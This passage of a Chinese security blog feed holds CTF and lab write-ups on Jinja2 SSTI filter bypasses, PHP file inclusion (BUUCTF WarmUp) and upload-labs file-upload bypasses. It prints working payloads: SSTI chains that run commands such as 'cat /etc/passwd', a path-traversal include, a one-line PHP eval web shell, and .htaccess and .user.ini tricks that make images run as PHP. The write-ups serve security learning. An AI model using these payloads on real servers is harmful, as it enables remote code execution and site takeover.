cmd=request|attr(form)|attr(getitem)(a)%&#125;<br>&#123;&#123;dict|attr(base)|attr(subclasses)()|attr(getitem)(len)|attr(init)|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;&amp;a=cat /etc/passwd<br></code></pre></td></tr></table></figure><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>我去。。。乍一看还有点吓人哈</p><p><img src="/2023/02/09/ssti/image-20230802172049912.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;%set pop=dict(pop=a)|join()%&#125;<br>&#123;%set str=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join()%&#125;<br>&#123;%set under=(a|select|string|list)|attr(pop)(str|length())%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set base=under~under~dict(base=a)|join()~under~under%&#125;<br>&#123;%set cmd=dict(whoami=a)|join()%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;&#123;lipsum|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure><p>这样已经可以getshell了，用lipsum很方便可以不用数字，但是shell命令不放在单独的一个请求参数里真的很难受。。。</p><p>试了很久，request被禁了，上一题意外发现url_for可以访问到request，但是这一题下划线又被禁了。。好家伙。下划线被禁了url_for也没法用，没错下划线被ban了是可以绕过，但是最后组成的也只是”url_for”这样一个字符串而已，并不是对象本身，那request和url_for都是全局对象，url_for能访问到request，然后就去找flask中别的全局对象，看看能不能用和上一题类似的方法访问到url_for或者request，都没成功。。作罢</p><p><code>&#123;&#123;lipsum.__globals__.__builtins__&#125;&#125;</code>里也有chr函数</p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="BUUCTF-WarmUp"><a href="#BUUCTF-WarmUp" class="headerlink" title="BUUCTF_ WarmUp"></a>BUUCTF_ WarmUp</h2><p>嗯。。一打开是一个滑稽脸直接一眼ctrl+u查看源代码，查找到注释提示source.php，进入source.php看到是php代码审计。</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213015433704.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看代码主体部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>       &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>       &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>   ) &#123;<br>       <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>       <span class="hljs-keyword">exit</span>;<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>   &#125;  <br></code></pre></td></tr></table></figure><p>明确了传入一个参数file，并且如果满足：</p><p>file不为空（被赋值）；是字符串；传入emmm类中的checkFile()方法后返回值为真。则能够将file包含。</p><p>审计emmm类，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br></code></pre></td></tr></table></figure><p>白名单中包含”source.php”和”hint.php”，source.php就是本页面，传入file&#x3D;hint.php对hint.php进行包含（一开始做的时候真的以为是什么提示硬是想不看提示自己琢磨结果发现无论如何还是得看的呜呜呜呜呜）</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213021555716.png"></p><p>告诉了我们得到flag不是在这，而是在ffffllllaaaagggg，继续审计，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>$page必须是有被赋值而且是字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>$page如果在白名单内（source.php和hint.php）则返回true。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br></code></pre></td></tr></table></figure><p>mb_substr(a,b,c)，对a字符串进行截取，从第b位开始，截取c个字符串长度，返回截取的字符串；</p><p>mb_strpos(a,b)，返回字符串b在字符串a中<em><strong>第一次</strong></em>出现的位置，如果没出现过则返回false；</p><p>mb_substr()截取$page，从第一个字符开始，截取长度为mb_strpos($page.’?’,’?’)，即问号在字符串page$.’?’（就是$page字符串最后面跟一个问号）中<em><strong>第一次</strong></em>出现的位置，记住是第一次，$page.’?’末尾的问号未必是第一次出现的位置。截取到的字符串赋值给$_page。（注意分清变量名）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果$_page在白名单里，则返回true，$_page的值我们是可以决定的，所以传入的file的值应以字符串”hint.php?”或者”source.php?”开头，这样一来经过mb_sudstr()的截取最终将”hint.php”或”source.php”与白名单进行对比返回为true。</p><p>到此为止已经满足了主体部分的三个条件了，结合hint.php的提示flag在ffffllllaaaagggg，传参?file&#x3D;hint.php?ffffllllaaaagggg，没有结果判断flag不在本目录，盲猜在根目录，于是</p><p>payload：</p><p>?file&#x3D;hint.php?.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg  或  ?file&#x3D;source?.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213024856357.png"></p><hr><h2 id="BUUCTF-新生赛include1"><a href="#BUUCTF-新生赛include1" class="headerlink" title="BUUCTF_新生赛include1"></a>BUUCTF_<strong>新生赛include1</strong></h2><p>一开始只有一个tips超链接，点击，提示“Can you find out the flag?”。查看源代码没有任何收获，发现url的位置是通过file传参，file&#x3D;flag.php。想到应该是主页源码含有文件包含，通过包含参数file。尝试php伪协议。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">?file=php://input<br></code></pre></td></tr></table></figure><p>页面发出警告“hacker!”尝试大写绕过失败，尝试filter伪协议读取网页源码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213113603645.png"></p><p>base64解码后拿到flag</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213113736893.png"></p><p>题后反思：用同样的方法查看了一下index.php源码</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213114000858.png"></p><p>过滤函数使用的是stristr()是不区分大小写的，strstr()则区分，同样还过滤掉了zip:&#x2F;&#x2F;和phar:&#x2F;&#x2F;还有data:&#x2F;&#x2F;。顺路学了下文件上传的zip:&#x2F;&#x2F;和phar:&#x2F;&#x2F;协议注入。</p><hr>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="uploads-labs"><a href="#uploads-labs" class="headerlink" title="uploads-labs"></a>uploads-labs</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>创建一个eval.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182310692.png"></p><p>被警告了，看一眼前端代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<br>        <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-comment">//定义允许上传的文件类型</span><br>        <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;<br>        <span class="hljs-comment">//提取上传文件的类型</span><br>        <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>        <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>        <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_">indexOf</span>(ext_name) == -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>            <span class="hljs-title function_">alert</span>(errMsg);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>前端检验后缀，把eval.php重命名为eval.jpg，bp抓包，改文件名，放行：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182602307.png"></p><p>蚁剑连接：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807182839790.png"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>同上题一样的改包姿势行不通，不是前端验证，这里存在后端MEME验证，</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807183157792.png"></p><p>这次改Content-Type为允许的类型来绕过</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807184128488.png"></p><p>蚁剑连接</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807183945951.png"></p><p>看一眼后端是怎么验证的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>))&#123;<br>    <span class="hljs-comment">//TODO</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>这次上传php木马后成这样：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230807184654061.png"></p><p>常见替代.php后缀有php(1-8)，pHp(1-8)，phtml等等：</p><p>，这里设了个黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br></code></pre></td></tr></table></figure><p>重命名eval.php为eval.phtml，上传</p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>emmm，常见的后缀基本上都被过滤了。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br></code></pre></td></tr></table></figure><p>，但是还是后端后缀检查，没过滤.htaccess，传一个.htaccess，将jpg后缀解析为php</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;FilesMatch &quot;eval.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>或者如下将所有文件解析为php：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br></code></pre></td></tr></table></figure><p>或如下指定后缀解析为php</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p>再上传eval.jpg脚本，最后蚁剑连接，当然前几题也适用，蚁剑连接：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808011650457.png"></p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>这个连.htaccess也过滤了，最后统一转为小写再进行过滤。。。挺严格的哈，瞅一眼提示：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230808025928958.png"></p><p>注意到upload里始终有一个readme.php，没过滤php7，也没过滤.ini可以上传.ini文件：</p><p>user.ini：(爱来自ChatGPT)</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">user<span class="hljs-selector-class">.ini</span> ： 自 PHP <span class="hljs-number">5.3</span>.<span class="hljs-number">0</span> 起，PHP 支持基于每个目录的 <span class="hljs-selector-class">.htaccess</span> 风格的 INI 文件。此类文件仅被<br>   CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用<br>   <span class="hljs-selector-class">.htaccess</span> 文件有同样效果。<br>   <br>   除了主 php<span class="hljs-selector-class">.ini</span> 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web<br>   根目录（$_SERVER<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>]</span> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。<br>   <br>   在 <span class="hljs-selector-class">.user</span><span 